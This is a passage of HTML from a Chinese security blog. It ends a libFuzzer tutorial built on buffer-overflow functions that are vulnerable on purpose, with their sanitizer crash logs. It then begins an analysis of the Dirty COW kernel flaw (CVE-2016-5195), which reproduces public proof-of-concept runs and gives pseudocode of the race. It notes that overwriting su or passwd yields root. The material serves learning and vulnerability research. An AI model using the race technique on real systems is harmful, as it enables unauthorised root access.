class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&#x3D;&#x3D;3898&#x3D;&#x3D;ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60200001b133 at pc 0x000000515620 bp 0x7ffd8ed9b2b0 sp 0x7ffd8ed9b2a8</span><br><span class="line">READ of size 1 at 0x60200001b133 thread T0</span><br><span class="line">    #0 0x51561f in VulnerableFunction1(unsigned char const*, unsigned long) &#x2F;home&#x2F;fanrong&#x2F;Computer&#x2F;libfuzzer-workshop&#x2F;lessons&#x2F;04&#x2F;.&#x2F;vulnerable_functions.h:22:14</span><br><span class="line">    #1 0x515d4e in LLVMFuzzerTestOneInput &#x2F;home&#x2F;fanrong&#x2F;Computer&#x2F;libfuzzer-workshop&#x2F;lessons&#x2F;04&#x2F;first_fuzzer.cc:10:3</span><br><span class="line">    #2 0x520993 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) &#x2F;home&#x2F;fanrong&#x2F;Computer&#x2F;libfuzzer-workshop&#x2F;libFuzzer&#x2F;Fuzzer&#x2F;FuzzerLoop.cpp:451:13</span><br><span class="line">    #3 0x520bc0 in fuzzer::Fuzzer::RunOne(unsigned char const*, unsigned long) &#x2F;home&#x2F;fanrong&#x2F;Computer&#x2F;libfuzzer-workshop&#x2F;libFuzzer&#x2F;Fuzzer&#x2F;FuzzerLoop.cpp:408:3</span><br><span class="line">    #4 0x5215ab in fuzzer::Fuzzer::MutateAndTestOne() &#x2F;home&#x2F;fanrong&#x2F;Computer&#x2F;libfuzzer-workshop&#x2F;libFuzzer&#x2F;Fuzzer&#x2F;FuzzerLoop.cpp:587:30</span><br></pre></td></tr></table></figure>
<p>fuzzer发现了一个<code>heap-buffer-overflow</code>，复现crash：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ .&#x2F;first_fuzzer crash-0eb8e4ed029b774d80f2b66408203801cb982a60</span><br></pre></td></tr></table></figure>
<p><strong>fuzzer例子2</strong><br>再考虑另一个函数：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">constexpr</span> <span class="keyword">auto</span> kMagicHeader = <span class="string">&quot;ZN_2016&quot;</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="built_in">std</span>::<span class="keyword">size_t</span> kMaxPacketLen = <span class="number">1024</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="built_in">std</span>::<span class="keyword">size_t</span> kMaxBodyLength = <span class="number">1024</span> - <span class="keyword">sizeof</span>(kMagicHeader);</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">VulnerableFunction2</span><span class="params">(<span class="keyword">const</span> <span class="keyword">uint8_t</span>* data, <span class="keyword">size_t</span> size, <span class="keyword">bool</span> verify_hash)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (size &lt; <span class="keyword">sizeof</span>(kMagicHeader))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="built_in">std</span>::<span class="built_in">string</span> <span class="title">header</span><span class="params">(<span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">const</span> <span class="keyword">char</span>*&gt;(data), <span class="keyword">sizeof</span>(kMagicHeader))</span></span>;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">array</span>&lt;<span class="keyword">uint8_t</span>, kMaxBodyLength&gt; body;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">strcmp</span>(kMagicHeader, header.c_str()))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">auto</span> target_hash = data[--size];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (size &gt; kMaxPacketLen)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  <span class="keyword">if</span> (!verify_hash)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">std</span>::copy(data, data + size, body.data());</span><br><span class="line">  <span class="keyword">auto</span> real_hash = DummyHash(body);</span><br><span class="line">  <span class="keyword">return</span> real_hash == target_hash;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个例子稍微复杂一点，用最简单的fuzz target来测试它（和第一个几乎一样）：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;vulnerable_functions.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="function"><span class="keyword">int</span> <span class="title">LLVMFuzzerTestOneInput</span><span class="params">(<span class="keyword">const</span> <span class="keyword">uint8_t</span> *data, <span class="keyword">size_t</span> size)</span> </span>&#123;</span><br><span class="line">  VulnerableFunction2(data, size, <span class="literal">false</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译fuzzer：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ clang++ -g -std&#x3D;c++11 -fsanitize&#x3D;address -fsanitize-coverage&#x3D;trace-pc-guard \</span><br><span class="line">second_fuzzer.cc ..&#x2F;..&#x2F;libFuzzer&#x2F;libFuzzer.a \</span><br><span class="line">-o second_fuzzer</span><br></pre></td></tr></table></figure>
<p>运行fuzzer：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ .&#x2F;second_fuzzer corpus2</span><br><span class="line">INFO: Seed: 844743323</span><br><span class="line">INFO: Loaded 1 modules (39 guards): [0x773ea0, 0x773f3c),</span><br><span class="line">Loading corpus dir: corpus2</span><br><span class="line">INFO: -max_len is not provided, using 64</span><br><span class="line">#0    READ units: 3</span><br><span class="line">#3    INITED cov: 5 ft: 5 corp: 3&#x2F;23b exec&#x2F;s: 0 rss: 29Mb</span><br><span class="line">#2097152    pulse  cov: 5 ft: 5 corp: 3&#x2F;23b exec&#x2F;s: 1048576 rss: 161Mb</span><br><span class="line">#4194304    pulse  cov: 5 ft: 5 corp: 3&#x2F;23b exec&#x2F;s: 838860 rss: 293Mb</span><br><span class="line">#8388608    pulse  cov: 5 ft: 5 corp: 3&#x2F;23b exec&#x2F;s: 838860 rss: 547Mb</span><br><span class="line">#16777216    pulse  cov: 5 ft: 5 corp: 3&#x2F;23b exec&#x2F;s: 883011 rss: 549Mb</span><br><span class="line">#33554432    pulse  cov: 5 ft: 5 corp: 3&#x2F;23b exec&#x2F;s: 958698 rss: 549Mb</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>输出没有什么意义，下面修改fuzz target，设置verify_hash为不同的值：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;vulnerable_functions.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="function"><span class="keyword">int</span> <span class="title">LLVMFuzzerTestOneInput</span><span class="params">(<span class="keyword">const</span> <span class="keyword">uint8_t</span> *data, <span class="keyword">size_t</span> size)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">bool</span> verify_hash_flags[] = &#123; <span class="literal">false</span>, <span class="literal">true</span> &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">auto</span> flag : verify_hash_flags)</span><br><span class="line">    VulnerableFunction2(data, size, flag);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译fuzzer：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ clang++ -g -std&#x3D;c++11 -fsanitize&#x3D;address -fsanitize-coverage&#x3D;trace-pc-guard \</span><br><span class="line">third_fuzzer.cc ..&#x2F;..&#x2F;libFuzzer&#x2F;libFuzzer.a \</span><br><span class="line">-o third_fuzzer</span><br></pre></td></tr></table></figure>
<p>在同一个语料库上运行fuzzer：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ .&#x2F;third_fuzzer corpus2</span><br></pre></td></tr></table></figure>
<p>fuzzer找到一条新路径，但还是没什么用。注意到：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INFO: -max_len is not provided, using 64</span><br></pre></td></tr></table></figure>
<p>但我们的目标分析<code>ZN_2016</code>协议的数据包的长度是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">constexpr std::size_t kMaxPacketLen &#x3D; 1024;</span><br></pre></td></tr></table></figure>
<p>那就添加libFuzzer的参数<code>-max_len=1024</code>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;third_fuzzer corpus2 -max_len&#x3D;1024</span><br><span class="line">INFO: Seed: 2241499835</span><br><span class="line">INFO: Loaded 1 modules (41 guards): [0x773ee0, 0x773f84),</span><br><span class="line">Loading corpus dir: corpus2</span><br><span class="line">#0    READ units: 3</span><br><span class="line">#3    INITED cov: 26 ft: 26 corp: 3&#x2F;23b exec&#x2F;s: 0 rss: 31Mb</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&#x3D;&#x3D;5664&#x3D;&#x3D;ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7ffedef9ecc8 at pc 0x0000004c57d1 bp 0x7ffedef9e710 sp 0x7ffedef9dec0</span><br><span class="line">WRITE of size 1023 at 0x7ffedef9ecc8 thread T0</span><br><span class="line">    #0 0x4c57d0 in __asan_memmove &#x2F;home&#x2F;fanrong&#x2F;Downloads&#x2F;src&#x2F;llvm&#x2F;projects&#x2F;compiler-rt&#x2F;lib&#x2F;asan&#x2F;asan_interceptors.cc:470</span><br><span class="line">    #1 0x5163f0 in unsigned char* std::__copy_move&lt;false, true, std::random_access_iterator_tag&gt;::__copy_m&lt;unsigned char&gt;(unsigned char const*, unsigned char const*, unsigned char*) &#x2F;usr&#x2F;lib&#x2F;gcc&#x2F;x86_64-linux-gnu&#x2F;5.4.0&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;include&#x2F;c++&#x2F;5.4.0&#x2F;bits&#x2F;stl_algobase.h:384:6</span><br><span class="line">    #2 0x5162c2 in unsigned char* std::__copy_move_a&lt;false, unsigned char const*, unsigned char*&gt;(unsigned char const*, unsigned char const*, unsigned char*) &#x2F;usr&#x2F;lib&#x2F;gcc&#x2F;x86_64-linux-gnu&#x2F;5.4.0&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;include&#x2F;c++&#x2F;5.4.0&#x2F;bits&#x2F;stl_algobase.h:401:14</span><br><span class="line">    #3 0x516220 in unsigned char* std::__copy_move_a2&lt;false, unsigned char const*, unsigned char*&gt;(unsigned char const*, unsigned char const*, unsigned char*) &#x2F;usr&#x2F;lib&#x2F;gcc&#x2F;x86_64-linux-gnu&#x2F;5.4.0&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;include&#x2F;c++&#x2F;5.4.0&#x2F;bits&#x2F;stl_algobase.h:438:18</span><br><span class="line">    #4 0x516033 in unsigned char* std::copy&lt;unsigned char const*, unsigned char*&gt;(unsigned char const*, unsigned char const*, unsigned char*) &#x2F;usr&#x2F;lib&#x2F;gcc&#x2F;x86_64-linux-gnu&#x2F;5.4.0&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;include&#x2F;c++&#x2F;5.4.0&#x2F;bits&#x2F;stl_algobase.h:470:15</span><br><span class="line">    #5 0x515a52 in VulnerableFunction2(unsigned char const*, unsigned long, bool) &#x2F;home&#x2F;fanrong&#x2F;Computer&#x2F;libfuzzer-workshop&#x2F;lessons&#x2F;04&#x2F;.&#x2F;vulnerable_functions.h:61:3</span><br><span class="line">    #6 0x515edc in LLVMFuzzerTestOneInput &#x2F;home&#x2F;fanrong&#x2F;Computer&#x2F;libfuzzer-workshop&#x2F;lessons&#x2F;04&#x2F;third_fuzzer.cc:13:5</span><br></pre></td></tr></table></figure>
<p>在<code>vulnerable_functions.h:61:3</code>找到了<code>stack-buffer-overflow</code>！<br><strong>fuzzer例子3</strong><br>看下面的函数：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">constexpr</span> <span class="built_in">std</span>::<span class="keyword">size_t</span> kZn2016VerifyHashFlag = <span class="number">0x0001000</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">VulnerableFunction3</span><span class="params">(<span class="keyword">const</span> <span class="keyword">uint8_t</span>* data, <span class="keyword">size_t</span> size, <span class="built_in">std</span>::<span class="keyword">size_t</span> flags)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">bool</span> verify_hash = flags &amp; kZn2016VerifyHashFlag;</span><br><span class="line">  <span class="keyword">return</span> VulnerableFunction2(data, size, verify_hash);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>实际上这只是前面函数的一个wrapper，但是关键点是这里有一个大的<code>flags</code>取值范围。列举fuzzer中所有可能的组合不太现实，而且也不能保证新的可能值不会再添加进来。<br>这种情况，我们可以借助libFuzzer提供的<code>data</code>来取一些<code>flags</code>的随机值：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;vulnerable_functions.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;functional&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="function"><span class="keyword">int</span> <span class="title">LLVMFuzzerTestOneInput</span><span class="params">(<span class="keyword">const</span> <span class="keyword">uint8_t</span> *data, <span class="keyword">size_t</span> size)</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="built_in">std</span>::<span class="built_in">string</span> <span class="title">data_string</span><span class="params">(<span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">const</span> <span class="keyword">char</span>*&gt;(data), size)</span></span>;</span><br><span class="line">  <span class="keyword">auto</span> data_hash = <span class="built_in">std</span>::hash&lt;<span class="built_in">std</span>::<span class="built_in">string</span>&gt;()(data_string);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">std</span>::<span class="keyword">size_t</span> flags = <span class="keyword">static_cast</span>&lt;<span class="keyword">size_t</span>&gt;(data_hash);</span><br><span class="line">  VulnerableFunction3(data, size, flags);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译运行fuzzer：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ clang++ -g -std&#x3D;c++11 -fsanitize&#x3D;address -fsanitize-coverage&#x3D;trace-pc-guard \</span><br><span class="line">fourth_fuzzer.cc ..&#x2F;..&#x2F;libFuzzer&#x2F;libFuzzer.a \</span><br><span class="line">-o fourth_fuzzer</span><br><span class="line">$ mkdir corpus3</span><br><span class="line">$ .&#x2F;fourth_fuzzer corpus3&#x2F; -max_len&#x3D;1024</span><br></pre></td></tr></table></figure>
<p>很快就能发现相同的crash，但是现在fuzzer对于<code>flags</code>的值来说是通用的了。<br>关于libFuzzer的基本使用就先介绍到这里，后面会继续学习一些实际的用法。<br><strong>reference</strong><br><a target="_blank" rel="noopener" href="https://github.com/Dor1s/libfuzzer-workshop">https://github.com/Dor1s/libfuzzer-workshop</a><br><a target="_blank" rel="noopener" href="https://github.com/google/fuzzer-test-suite">https://github.com/google/fuzzer-test-suite</a><br><a target="_blank" rel="noopener" href="http://llvm.org/docs/LibFuzzer.html">http://llvm.org/docs/LibFuzzer.html</a><br><a target="_blank" rel="noopener" href="https://security.googleblog.com/2016/08/guided-in-process-fuzzing-of-chrome.html">https://security.googleblog.com/2016/08/guided-in-process-fuzzing-of-chrome.html</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://example.com/2017/07/14/Dirty-COW%EF%BC%88CVE-2016-5195%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Bruce Fan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="BruceFan's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2017/07/14/Dirty-COW%EF%BC%88CVE-2016-5195%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">Dirty COW（CVE-2016-5195）漏洞分析</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建于：2017-07-14 00:01:35" itemprop="dateCreated datePublished" datetime="2017-07-14T00:01:35+08:00">2017-07-14</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="更新于：2020-11-12 10:26:14" itemprop="dateModified" datetime="2020-11-12T10:26:14+08:00">2020-11-12</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>CVE-2016-5195是一个几乎通杀全版本linux的本地提权的神洞，最近学习了Linux内核的一些调试方法和漏洞利用技术，但到目前为止做过的漏洞还都是比赛中的题目，都是驱动上的漏洞，没有做过实际漏洞的分析，这篇文章作为第一次对实际Linux Kernel漏洞的分析学习。</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>为了增加学习的动力和乐趣，下面先对漏洞进行复现，看看它的威力：<br>我的环境：VirtualBox + Ubuntu 12.04 x86_64<br>这里的Ubuntu虚拟机是之前介绍VirtualBox调试内核时用到的，自己编译了linux-3.13的内核，因为据说一些发行版已经修复了该漏洞，后面的分析也是基于3.13进行的，不同版本的内核函数名和执行流程可能稍有不同，但原理相同。<br>先运行两个<a target="_blank" rel="noopener" href="https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs">PoC</a>，<a target="_blank" rel="noopener" href="https://github.com/dirtycow/dirtycow.github.io/blob/master/dirtyc0w.c">dirtyc0w.c</a>和<a target="_blank" rel="noopener" href="https://gist.github.com/rverton/e9d4ff65d703a9084e85fa9df083c679">cowroot.c</a>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ su</span><br><span class="line"># echo hellodirtycow &gt; foo</span><br><span class="line"># chmod 0404 foo</span><br><span class="line">$ cat foo</span><br><span class="line">hellodirtycow</span><br><span class="line">$ echo howtoexploit &gt; foo</span><br><span class="line">bash: foo: Permission denied</span><br><span class="line">$ gcc -pthread dirtyc0w.c -o dirtyc0w</span><br><span class="line">$ .&#x2F;dirtyc0w foo howtoexploit</span><br><span class="line">mmap 7f0e2d982000</span><br><span class="line">madvise 0</span><br><span class="line">procselfmem 1200000000</span><br><span class="line">$ cat foo</span><br><span class="line">howtoexploitw</span><br></pre></td></tr></table></figure>
<p>dirtyc0w.c这个PoC可以实现向任意可读文件写任意内容。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -pthread cowroot.c -o cowroot</span><br></pre></td></tr></table></figure>
<p><img src="/images/dirtycow/poc.png"><br>cowroot.c可以实现提权。</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>CVE-2016-5195是一个内核竞态条件漏洞，影响范围：Linux Kernel &gt; 2.6.22。<br>学习漏洞需要了解以下知识：</p>
<ul>
<li>写时拷贝(Copy on Write, COW)</li>
<li>竞态条件</li>
<li>页式内存管理</li>
<li>缺页中断处理</li>
</ul>
<p>该漏洞的成因是<code>get_user_page</code>内核函数在处理<code>Copy-on-Write</code>(以下使用COW表示)的过程中，可能发生竞态条件造成COW过程被破坏，导致出现写数据到进程地址空间内只读内存区域的机会。当我们向带有<code>MAP_PRIVATE</code>标志的只读文件映射区域写数据时，会产生一个映射文件的复制(COW)，对此区域的任何修改都不会写回原来的文件，如果上述的竞态条件发生，就能成功的写回原来的文件。比如我们修改su或者passwd程序就可以达到root的目的。</p>
<h3 id="dirtyc0w-c简要分析"><a href="#dirtyc0w-c简要分析" class="headerlink" title="dirtyc0w.c简要分析"></a>dirtyc0w.c简要分析</h3><p>前面用到的第一个PoC关键部分伪代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Main:</span><br><span class="line">    fd &#x3D; open(filename, O_RDONLY)</span><br><span class="line">    fstat(fd, &amp;st)</span><br><span class="line">    map &#x3D; mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0)</span><br><span class="line">    start Thread1</span><br><span class="line">    start Thread2</span><br><span class="line"></span><br><span class="line">Thread1:</span><br><span class="line">    f &#x3D; open(&quot;&#x2F;proc&#x2F;self&#x2F;mem&quot;, O_RDWR)</span><br><span class="line">    while (1):</span><br><span class="line">        lseek(f, map, SEEK_SET)</span><br><span class="line">        write(f, shellcode, strlen(shellcode))</span><br><span class="line"></span><br><span class="line">Thread2:</span><br><span class="line">    while (1):</span><br><span class="line">        madvise(map, 100, MADV_DONTNEED)</span><br></pre></td></tr></table></figure>
<p>首先打开需要修改的只读文件并使用<code>MAP_PRIVATE</code>标志映射文件到内存区域，然后启动两个线程：<br>线程1：向文件映射的内存区域写数据，这时内核采用COW机制。<br>线程2：使用带<code>MADV_DONTNEED</code>参数的<code>madvise</code>系统调用将文件映射内存区域释放，达到干扰线程1的COW过程，产生竞态条件，当竞态条件发生时就能成功写入文件。</p>
<h3 id="漏洞原理分析"><a href="#漏洞原理分析" class="headerlink" title="漏洞原理分析"></a>漏洞原理分析</h3><p>PoC代码中有一个写<code>/proc/self/mem</code>的线程，关键操作是<code>lseek</code>和<code>write</code>函数。对应内核中的代码<a target="_blank" rel="noopener" href="http://lxr.linux.no/linux+v3.13/fs/proc/base.c">base.c</a>：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">proc_mem_operations</span> =</span> &#123;</span><br><span class="line">       .llseek         = mem_lseek,</span><br><span class="line">       .read           = mem_read,</span><br><span class="line">       .write          = mem_write,</span><br><span class="line">       .open           = mem_open,</span><br><span class="line">       .release        = mem_release,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>mem_write函数关键代码流程如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mem_write -&gt; mem_rw -&gt; access_remote_vm -&gt; __access_remote_vm</span><br></pre></td></tr></table></figure>
<p><code>__access_remote_vm</code>函数中完成了数据的写操作，将应用层的数据写到目标位置，代码如下：</p>
